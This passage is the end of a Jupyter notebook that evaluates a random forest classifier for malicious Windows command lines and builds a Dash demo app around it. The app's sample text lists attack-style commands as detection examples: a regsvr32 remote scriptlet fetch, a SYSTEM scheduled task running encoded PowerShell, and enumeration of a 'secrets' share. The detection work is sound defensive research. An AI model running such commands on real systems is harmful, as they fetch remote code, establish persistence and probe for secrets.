     "data": {
      "text/plain": [
       "0.6612903225806451"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>predicted_0</th>\n",
       "      <th>predicted_1</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>actual_0</th>\n",
       "      <td>4481</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>actual_1</th>\n",
       "      <td>42</td>\n",
       "      <td>82</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          predicted_0  predicted_1\n",
       "actual_0         4481            0\n",
       "actual_1           42           82"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.DataFrame(data=[[tn,fp],[fn,tp]], index=['actual_0', 'actual_1'], columns=['predicted_0', 'predicted_1'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "best_model.save('rf_model')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Plotly Dash Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'v1.0', 'powershell.exe', '']\n",
    "\n",
    "import re\n",
    "def demo_clean_input(s):\n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "        | (>>)\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_coefs(tokens):\n",
    "    \"\"\" get the coefficient for tokens passed from GUI and returns as string \"\"\"\n",
    "    \n",
    "    _format = \"{}: *{:.5f}*\\n\"\n",
    "    s = \"\"\n",
    "\n",
    "    token_coefs = []\n",
    "    for token in tokens.split(','):\n",
    "        try:\n",
    "            weight = best_vocab_importance_df.loc[best_vocab_importance_df.loc[:, 'token'] == token, 'importance'].values[0]\n",
    "            s += _format.format(token, weight)\n",
    "        except:\n",
    "            weight = 0.0  # token is not in vocabulary, therefore return 0 for weight\n",
    "            s += _format.format(token, weight)   \n",
    "    return s\n",
    "\n",
    "# get_coefs('cmd.exe,/c,/t')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "def spark_code(s):\n",
    "    \"\"\" tokenizes the input and calls the existing feature and prediction pipelines to transform the input \"\"\"\n",
    "    \n",
    "    # create tokens\n",
    "    tokens = demo_clean_input(s)\n",
    "    print(tokens)\n",
    "    \n",
    "    # create dataframe\n",
    "    _schema = T.StructType([\n",
    "        T.StructField('cmd_line_tokens', T.StringType(), True),\n",
    "    ])         \n",
    "    myrow = Row(cmd_line_tokens=tokens)\n",
    "    text_df = spark.createDataFrame([myrow], schema=_schema).withColumn('cmd_line_tokens', F.split(F.col('cmd_line_tokens'), r','))\n",
    "    \n",
    "    #transform features using existing pipelines\n",
    "    features = best_model.transform(text_df)\n",
    "    \n",
    "    _features = features.select('cmd_line_tokens').rdd.take(1)[0]['cmd_line_tokens']\n",
    "    prediction = features.select('prediction').rdd.take(1)[0]['prediction']\n",
    "    probability = features.select('probability').rdd.take(1)[0]['probability']\n",
    "    \n",
    "    coefs = get_coefs(tokens)\n",
    "    \n",
    "    result = \"\"\"\n",
    "    Tokens: {} \\n \n",
    "    Probability: {} \\n \n",
    "    Prediction: {} \\n \n",
    "    {}\n",
    "    \"\"\"\n",
    "    \n",
    "    if prediction == 0:\n",
    "        return result.format(_features, probability, prediction, \"*** Benign ***\"), coefs\n",
    "    else:\n",
    "        return result.format(_features, probability, prediction, \"*** Malicious ***\"), coefs\n",
    "                         \n",
    "# spark_code(r'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s SENS')\n",
    "# spark_code(r'\"powershell.exe -ExecutionPolicy Bypass -C \"\"Compress-Archive -Path C:\\Users\\win10-user3\\staged-DestinationPath C:\\Users\\win10-user3\\staged.zip -Force;ls C:\\Users\\win10-user3\\staged.zip | foreach {$_.FullName} | select')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "import dash\n",
    "import dash_table\n",
    "import dash_core_components as dcc\n",
    "import dash_html_components as html\n",
    "from jupyterlab_dash import AppViewer\n",
    "from dash.dependencies import Input, Output\n",
    "\n",
    "external_stylesheets = ['https://codepen.io/chriddyp/pen/bWLwgP.css']\n",
    "\n",
    "viewer = AppViewer()\n",
    "\n",
    "app = dash.Dash(name=__name__, external_stylesheets=external_stylesheets)\n",
    "\n",
    "markdown_text = '''\n",
    "### Windows process command-line classifier (Random Forest)\n",
    "Please copy and paste your log in the box below\n",
    "'''\n",
    "\n",
    "sample_input_data = r'''\n",
    "### Example malicious logs \n",
    "+ C:\\Windows\\system32\\regsvr32.exe\" /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\n",
    "+ powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Path \\\".\\\" -Name \\\"staged\\\" -ItemType \\\"directory\\\" -Force | foreach {$_.FullName} | Select-Object\"\n",
    "+ cmd.exe /C \"net share\"\n",
    "powershell.exe -ExecutionPolicy Bypass -C \"start powershell.exe -ArgumentList \\\"-NoP\\\",\\\"-StA\\\",\\\"-ExecutionPolicy\\\",\\\"bypass\\\",\\\".\\Emulate-Administrator-Tasks.ps1\\\"\"\n",
    "### Example benign logs \n",
    "+ C:\\Windows\\system32\\dllhost.exe /Processid:{B2FEB3AD-8AE6-42E7-B2E4-60609573B404}\n",
    "+ C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s SENS \n",
    "+ C:\\Windows\\System32\\Upfc.exe /launchtype boot /cv 09o3CnnAskG8AMTNUwkQhQ.0\n",
    "### Example logs not in dataset\n",
    "+ cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \"powershell.exe -nop -exec bypass -EncodedCommand $pcode\" /sc ONLOGON /RU SYSTEM'\n",
    "+ cmd.exe /c dir /s /b \\\\\\\\FILE001\\\\secrets\n",
    "+ C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -nop -exec bypass -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQA\n",
    "+ cmd.exe /c reg query \"\\\\\\\\\\\\\\\\FILE001\\\\secrets\\\\hklm\\\\system\\\\currentcontrolset\\\\control\\\\terminal server\n",
    "'''\n",
    "\n",
    "app.layout = html.Div([\n",
    "    html.Div([\n",
    "        html.Div([\n",
    "            dcc.Markdown(children=markdown_text),\n",
    "            dcc.Textarea(id='input', value='C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc', style={'height': '50px', 'width': '50%'}),\n",
    "            \n",
    "        html.Div([html.Button(children='Submit', id='button', n_clicks=0)], style={'margin': '2px'}),\n",
    "            \n",
    "        html.Div([\n",
    "            dcc.Textarea(id='output', value='', style={'height': '175px', 'width': '50%'}),\n",
    "            dcc.Textarea(id='coefs', value='', style={'height': '175px', 'width': '25%'})\n",
    "        ]),\n",
    "            dcc.Markdown(children=sample_input_data)\n",
    "        ])\n",
    "    ])\n",
    "])\n",
    "    \n",
    "@app.callback(\n",
    "    [Output(component_id='output', component_property='value'),  # set output component on reactive change\n",
    "    Output(component_id='coefs', component_property='value')],\n",
    "    [Input(component_id='button', component_property='n_clicks')],  #  reactive input comes from button press\n",
    "    [dash.dependencies.State('input', 'value')]\n",
    ")\n",
    "def on_click(n_clicks, value):\n",
    "    # call pyspark logic from here\n",
    "    return spark_code(value)\n",
    "    \n",
    "\n",
    "viewer.show(app)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
